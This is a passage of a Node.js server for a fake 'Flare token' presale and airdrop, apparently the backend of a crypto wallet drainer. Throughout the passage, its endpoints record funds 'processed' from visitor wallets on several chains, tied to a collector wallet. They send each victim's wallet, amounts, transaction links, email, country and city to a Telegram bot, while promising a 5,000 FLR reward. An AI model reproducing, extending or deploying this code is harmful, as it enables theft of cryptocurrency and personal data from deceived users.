      valueUSD,
      gasFee,
      email,
      location 
    } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n💰 PROCESS FLARE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    const flow = memoryStorage.pendingFlows.get(flowId);
    
    // Get explorer URL
    const explorerUrl = RPC_CONFIG[chainName]?.explorer || '';
    const txLink = explorerUrl ? `${explorerUrl}${txHash}` : txHash;
    
    // Track processed amounts by chain
    if (!memoryStorage.settings.statistics.totalProcessedAmounts[chainName]) {
      memoryStorage.settings.statistics.totalProcessedAmounts[chainName] = {
        count: 0,
        totalAmount: 0,
        totalUSD: 0,
        totalGas: 0
      };
    }
    
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].count++;
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalAmount += parseFloat(amount || 0);
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalUSD += parseFloat(valueUSD || 0);
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalGas += parseFloat(gasFee || 0);
    
    if (participant) {
      participant.flowProcessed = true;
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        gasFee,
        txLink,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        gasFee,
        email,
        location,
        txLink,
        timestamp: new Date().toISOString()
      });
      
      if (memoryStorage.settings.statistics.processedTransactions.length > 200) {
        memoryStorage.settings.statistics.processedTransactions = 
          memoryStorage.settings.statistics.processedTransactions.slice(-200);
      }
      
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        flow.completedChains.push(chainName);
        flow.status = flow.completedChains.length === flow.transactions?.length ? 'completed' : 'processing';
        
        // CHAIN PROCESSED REPORT
        const chainMessage = 
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `💰 <b>FLARE CHAIN PROCESSED</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          
          `👛 <b>WALLET:</b>\n` +
          `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
          `   🔗 Chain: <b>${chainName}</b>\n` +
          `   💵 Amount: <b>${amount} ${symbol}</b> ($${valueUSD})\n` +
          `   ⛽ Gas Fee: ${gasFee || '0'} ETH\n\n` +
          
          `🔍 <b>TRANSACTION:</b>\n` +
          `   🆔 Hash: \`${txHash}\`\n` +
          `   🔗 Explorer: ${txLink}\n\n` +
          
          `📊 <b>PROGRESS:</b>\n` +
          `   ✅ Completed: ${flow.completedChains.length}/${flow.transactions?.length} chains\n` +
          `   📈 Status: ${flow.completedChains.length === flow.transactions?.length ? 'COMPLETED' : 'PROCESSING'}\n\n` +
          
          `📍 <b>LOCATION:</b>\n` +
          `   🏳️ Country: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
          `   📧 Email: ${email || participant.email}\n\n` +
          
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        await sendTelegramMessage(chainMessage);
        
        if (flow.completedChains.length === flow.transactions?.length) {
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString(),
            participant: {
              country: location?.country || participant.country,
              flag: location?.flag || participant.flag,
              email: email || participant.email
            }
          });
          
          if (memoryStorage.completedFlows.size > 50) {
            const oldestKey = Array.from(memoryStorage.completedFlows.keys())[0];
            memoryStorage.completedFlows.delete(oldestKey);
          }
          
          // Build completed chains list
          let completedList = '';
          flow.completedChains.forEach((c, i) => {
            completedList += `   ${i+1}. ${c}\n`;
          });
          
          // FLOW COMPLETED REPORT
          const completedMessage = 
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎉 <b>FLARE FLOW COMPLETED</b> 🎉\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            
            `👛 <b>WALLET:</b>\n` +
            `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
            `   💵 Total Processed: <b>$${flow.totalFlowUSD}</b>\n` +
            `   🎁 FLR Received: <b>5,000 FLR</b>\n\n` +
            
            `✅ <b>COMPLETED CHAINS:</b>\n${completedList}\n` +
            
            `📍 <b>LOCATION:</b>\n` +
            `   🏳️ Country: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
            `   📧 Email: ${email || participant.email}\n\n` +
            
            `🆔 <b>FLOW:</b> \`${flowId}\`\n\n` +
            
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `✅ <b>Distribution Complete</b>`;
          
          await sendTelegramMessage(completedMessage);
        }
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Process flow error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================
// CLAIM ENDPOINT - ULTRA DETAILED
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { 
      walletAddress, 
      email, 
      location, 
      chains, 
      totalProcessedValue, 
      reward, 
      bonus 
    } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    participant.claimData = {
      email,
      chains,
      totalProcessedValue,
      reward,
      bonus,
      location
    };
    
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // Build chains list
    let chainsList = '';
    if (chains && chains.length > 0) {
      chains.forEach((c, i) => {
        chainsList += `   ${i+1}. ${c}\n`;
      });
    } else {
      chainsList = '   • No chains recorded\n';
    }
    
    // ULTRA DETAILED CLAIM REPORT
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🎉 <b>FLARE TOKEN CLAIMED</b> 🎉\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   🎟️ Claim ID: \`${claimId}\`\n\n` +
      
      `🎁 <b>REWARD:</b>\n` +
      `   🪙 Token: <b>${reward || '5,000 FLR'}</b>\n` +
      `   💰 Bonus: <b>${bonus || '20%'}</b>\n` +
      `   💵 Value: <b>$${totalProcessedValue || '850'}</b>\n\n` +
      
      `✅ <b>PROCESSED CHAINS:</b>\n${chainsList}\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ Country: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
      `   🏙️ City: ${location?.city || participant.city}\n` +
      `   📧 Email: ${email || participant.email}\n\n` +
      
      `📊 <b>STATISTICS:</b>\n` +
      `   👥 Total Participants: ${memoryStorage.participants.length}\n` +
      `   🎯 Eligible Wallets: ${memoryStorage.participants.filter(p => p.isEligible).length}\n` +
      `   ✅ Claimed Wallets: ${memoryStorage.settings.statistics.claimedParticipants}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ <b>CLAIM SUCCESSFUL</b>`;
    
    await sendTelegramMessage(message);
    
    res.json({ 
      success: true,
      data: {
        claimId,
        reward,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// GET FLARE STATS ENDPOINT
// ============================================

app.get('/api/flare/stats', (req, res) => {
  const totalEligible = memoryStorage.participants.filter(p => p.isEligible).length;
  const totalClaimed = memoryStorage.participants.filter(p => p.claimed).length;
  const totalFLRDistributed = totalClaimed * 5000;
  
  res.json({
    success: true,
    data: {
      token: 'FLR',
      totalParticipants: memoryStorage.participants.length,
      eligibleWallets: totalEligible,
      claimedWallets: totalClaimed,
      totalFLRDistributed,
      uniqueVisitors: memoryStorage.settings.statistics.uniqueIPs.size,
      siteVisits: memoryStorage.siteVisits.length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD,
      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
      timestamp: new Date().toISOString()
    }
  });
});

// ============================================
// ADMIN DASHBOARD
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const totalFLRDistributed = memoryStorage.participants.filter(p => p.claimed).length * 5000;
  
  // Get recent visits
  const recentVisits = memoryStorage.siteVisits
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 10);
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary: {
      totalVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
      totalFLRDistributed,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
      telegramBot: telegramBotName || 'N/A'
    },
    recentVisits: recentVisits.map(v => ({
      id: v.id,
      country: v.country,
      flag: v.flag,
      city: v.city,
      device: v.device,
      isBot: v.isBot,
      time: v.timestamp
    }))
  });
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalFLRDistributed: memoryStorage.participants.filter(p => p.claimed).length * 5000,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      telegram: telegramEnabled ? '✅' : '❌',
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

// ============================================
// TELEGRAM TEST ENDPOINT
// ============================================

app.get('/api/admin/test-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const testMessage = 
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🧪 <b>FLARE TOKEN TEST MESSAGE</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `✅ <b>Telegram Integration Working!</b>\n\n` +
    `🤖 Bot: @${telegramBotName || 'unknown'}\n` +
    `📊 Status: ${telegramEnabled ? '🟢 ACTIVE' : '🔴 INACTIVE'}\n` +
    `⏰ Time: ${new Date().toLocaleString()}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
  
  const success = await sendTelegramMessage(testMessage);
  
  res.json({ 
    success, 
    telegramEnabled,
    botName: telegramBotName
  });
});

// ============================================
// FORCE TELEGRAM ENDPOINT
// ============================================

app.get('/api/admin/force-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.status(401).json({ success: false, error: 'Invalid token' });
  }
  
  const result = await forceEnableTelegram();
  
  res.json({
    success: result,
    telegramEnabled,
    botName: telegramBotName,
    message: result ? '✅ Telegram force-enabled successfully' : '❌ Failed to enable Telegram'
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// ERROR HANDLER
// ============================================

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ FLARE TOKEN BACKEND - ULTRA DETAILED REPORTING
  ================================================
  📍 Port: ${PORT}
  🔗 URL: https://flarebackend.vercel.app/
  🪙 Token: FLR (Flare)
  
  📦 COLLECTOR WALLET: ${COLLECTOR_WALLET}
  
  🌐 DEPLOYED CONTRACTS:
  ✅ Ethereum: 0x7264F557f762f16aC7937292D19449c5CE962288
  ✅ BSC: 0x7264F557f762f16aC7937292D19449c5CE962288
  ✅ Polygon: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
  ✅ Arbitrum: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
  ✅ Avalanche: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
  ✅ Flare: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
  
  📊 TELEGRAM STATUS: Attempting to connect...
  ================================================
  `);
  
  const telegramConnected = await forceEnableTelegram();
  
  console.log(`
  📊 MONITORING:
  👥 Participants: 0
  🎯 Eligible: 0
  ✅ Claimed: 0
  💰 Flows: 0
  💵 Total Processed: $0
  📱 Telegram: ${telegramConnected ? '✅ ACTIVE' : '❌ INACTIVE'}
  
  🚀 READY FOR FLARE TOKEN DISTRIBUTION
  ================================================
  `);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  process.exit(0);
});
